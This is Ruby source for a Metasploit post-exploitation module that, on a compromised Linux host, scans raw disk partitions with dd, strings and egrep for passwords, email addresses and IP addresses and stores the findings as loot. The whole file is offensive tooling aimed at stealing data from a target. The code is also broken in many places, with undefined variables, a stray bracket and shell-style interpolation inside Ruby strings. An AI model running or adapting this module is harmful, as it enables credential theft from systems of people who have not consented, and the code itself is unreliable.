require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Bulk Extractor',
				'Description'   => %q{ Extracts information from posix systems (disks & memory) using 
					similar (but much more ghetto) methods as the tool bulk_extractor.
					Binary search overrides any string searching and requires uploading a reference 
					file to the target's filesystem},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'kernelsmith'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ] #meterpreter?
			))
		register_options(
			[

				OptBool.new('MEMORY', [false, 'Also try to extract info from running memory',false]),
				OptString.new('PARTITIONS',[true, "Comma separated list of partitions to try","/dev/sda1"]),
				OptInt.new('MIN_STR_LEN', [true, 'Strings less than this are discarded',4]),
				OptInt.new('COUNT', [true, 'Number of blocks to read',4]),
				OptInt.new('SKIP', [true, 'Number of blocks to skip',0]),
				OptInt.new('CHUNK', [true, 'Chop the partition into CHUNK chunks to give target disk time to recover',1]),
				OptInt.new('SLEEP', [true, 'Seconds to wait between chunk processing',2]),
				OptInt.new('BLOCK_SIZE', [false, 'Do not use filesystem block size, use this specific size instead']),
				OptBool.new('SEARCH_IPS', [false, 'Look for things that look like IP addresses',true]),
				OptBool.new('SEARCH_PASS', [false, 'Look for things starting with pass/PASS etc',true]),
				OptBool.new('SEARCH_EMAIL', [false, 'Look for things that look like email addresses',true]),
				OptPath.new('SEARCH_BIN', [false, 'Look for binary byte sequence specified in this file']),
				OptString.new('OTHER_REGEX',[false, "Double comma separated list of other REGEX's to apply, you must shell escape them"]),

			], self.class)
	end

	def run
		# TODO: check root at some point? is_root?
		REGEX_IP=%q{'\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'}
		REGEX_PASS=%q{'[Pp][Aa][Ss][Ss]'}
		REGEX_EMAIL=%q{'\w+([._-]\w)*@\w+([._-]\w)*\.\w{2,4}'}
		expressions=[]
		expressions << $REGEX_IP if datastore['SEARCH_IPS']
		expressions << $REGEX_PASS if datastore['SEARCH_PASS']
		expressions << $REGEX_EMAIL if datastore['SEARCH_EMAIL']
		if datastore['OTHER_REGEX']
			others = datastore['OTHER_REGEX'].split(/,,/)
			expressions += others
		end
			
		grep_cmd = 'egrep'
		grep_opts = expressions.join("\\|")

		bin = true if datastore['SEARCH_BIN']
		if bin
			grep_cmd = "grep"
			lfile = "#{datastore['SEARCH_BIN']}"
			rfile = Rex::Text.rand_text_alpha(rand(8)+6) # randomize file name
			# write the contents of lfile to disk on the target as rfile
			write_file(rfile, File.open(lfile, 'r') {|f| f.read})
			grep_opts = "-abo -f #{rfile}"
			# add in some additional piping to clean up results
			grep_opts << " | cut -d ':' -f 1"
		end

		# build up the cmd pipe that will do the filtering for us
		filter_pipe = ""
		#- if not a bin search, there's a strings portion
		filter_pipe << " | strings -n #{datastore['MIN_STR_LEN']}" if ! bin
		#- if there are grep_opts, add the grep cmd and the grep options
		if grep_opts and not grep_opts.nil? and not grep_opts.empty?
			filter_pipe << " | #{grep_cmd} #{grep_opts}"
		end

		distro = get_sysinfo
		store_loot("linux.version", "text/plain", session, "Distro: #{distro[:distro]}, Version: #{distro[:version]}, Kernel: #{distro[:kernel]}", "linux_info.txt", "Linux Version")

		# Print the info
		print_status("Info:")
		print_status("\t#{distro[:version]}")
		print_status("\t#{distro[:kernel]}")

		partitions = datastore['PARTITIONS'].split(',')
		results = {}
		partitions.each do |partition|
			# TODO check to see if partition is valid
			results[partition] = get_matches(
				filter_pipe, partition, datastore['CHUNK'], datastore['SLEEP'],
				datastore['COUNT'], datastore['SKIP']]
				)
			#TODO pass datastore['BLOCK_SIZE' too
		end
		# do some extra stuff if binary search
		if bin
			# remove the bin file
			cmd_exec("rm -f", "$rfile", 10)
		end
		
		# for now just print, TODO: do something better with results
		# results is a hash looking like { "/dev/sda1" => ["finding1", "finding2", "3"] }
		print_good results.inspect
	end	

	def get_matches(filter_pipe,partition,chunks,sleep,start_count=1,start_skip=0,block_size=nil)
		#
		# get block size if needed
		#cmd = "dumpe2fs $partition | grep 'Block size' | tr -d ' ' | cut -d ':' -f 2"
		#print_good "running $cmd"
		if block_size.nil?
			block_size = cmd_exec(dumpe2fs, "$partition | grep 'Block size' | tr -d ' ' | cut -d ':' -f 2", 30)
		end
		# get block count if needed
		if chunks > 1
			block_count = cmd_exec(dumpe2fs, "$partition | grep 'Block count' | tr -d ' ' | cut -d ':' -f 2", 15)
		end

		results = []
		chunk_size = block_count / chunks
		chunks.times do |chunk|
			#TODO, calculate count and skip based on block_count and chunk
			count = chunk_size + 1 # add 1 for remainder and to handle case when spanning a chunk
			skip = start_skip + (chunk -1)*chunk_size
			cmd = "dd"
			opts = "if=${partition} bs=${block_size} count=${count} skip=${skip} #{filter_pipe}"
			bulk_results = cmd_exec(cmd,opts,time_out)
			# process the results converting to an array of strings, instead of one giant string
			arr = bulk_results.split(/\n/) # convert to array of strings
			# in the bin case, this is an array of strings representing decimal byte offsets
			if bin
				arr.each do |item|
					# calculate the actual offset in bytes (decimal)
					results << (item.to_i + skip.to_i * block_size)
				end
			else
				results = results + arr
			end
		end
			select(nil,nil,nil, $sleep)
		end
		results
	end
end
